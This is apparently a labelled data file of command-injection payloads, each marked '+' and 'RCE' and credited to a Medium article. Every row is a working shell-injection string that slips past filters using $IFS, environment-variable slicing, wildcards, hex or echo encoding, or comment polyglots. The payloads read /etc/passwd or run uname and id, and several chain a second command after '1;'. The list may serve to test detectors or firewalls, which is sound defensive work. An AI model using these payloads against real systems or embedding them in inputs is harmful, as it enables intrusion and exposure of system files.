+,RCE,cat$IFS/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,IFS=];b=cat]/etc/passwd;$b,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"IFS=,;`cat<<<cat,/etc/passwd`",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,uname${IFS}-a,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,cat ${HOME:0:1}etc${HOME:0:1}passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"cat $(echo . | tr '!-0' '""-1')etc$(echo . | tr '!-0' '""-1')passwd",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,cat${IFS}${PATH%%u*}etc${PATH%%u*}passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,${PATH##*s????}${PATH%%u*}c??${IFS}${PATH%%u*}e??${PATH%%u*}??ss??,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,${PATH##*s????}${PATH%%u*}ca${u}t${IFS}${PATH%%u*}et${u}c${PATH%%u*}pas${u}swd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,${PATH##*s????}${PATH%%u*}bas${u}h${IFS}${PHP_CFLAGS%%f*}c${IFS}l${u}s,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,${PATH:0:1}bi?${PATH:0:1}ca?${IFS}${PATH:0:1}et?${PATH:0:1}??sswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,tail${IFS}${APACHE_CONFDIR%${APACHE_CONFDIR#?}}et?${APACHE_CONFDIR%${APACHE_CONFDIR#?}}pas?wd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,c${a}at${IFS}${APACHE_CONFDIR%apache2}pas${s}swd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,ca${jjj}t${IFS}${APACHE_RUN_DIR%???????????????}et${jjj}c${APACHE_RUN_DIR%???????????????}pas${jjj}swd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,c${u}at${IFS}${PHP_INI_DIR%%u*p}e${u}tc${PHP_INI_DIR%%u*p}p${u}asswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"cat `echo -e ""\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64""`",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,cat `xxd -r -p <<< 2f6574632f706173737764`,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,cat `xxd -r -ps <(echo 2f6574632f706173737764)`,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,1;uname${IFS}-a,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,1;uname${IFS}-a;#,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,1;uname${IFS}-a;#${IFS}',https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,1;uname${IFS}-a;#${IFS}';,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,/*$(id)`id`,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"/*$(id)`id``*/-id-'/*$(id)`id` #*/-id||'""||id||""/*`*/",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
+,RCE,"/*$(id)`id``*/id'/*$(id)`id` #*/id||'""||id||""/*`*/",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
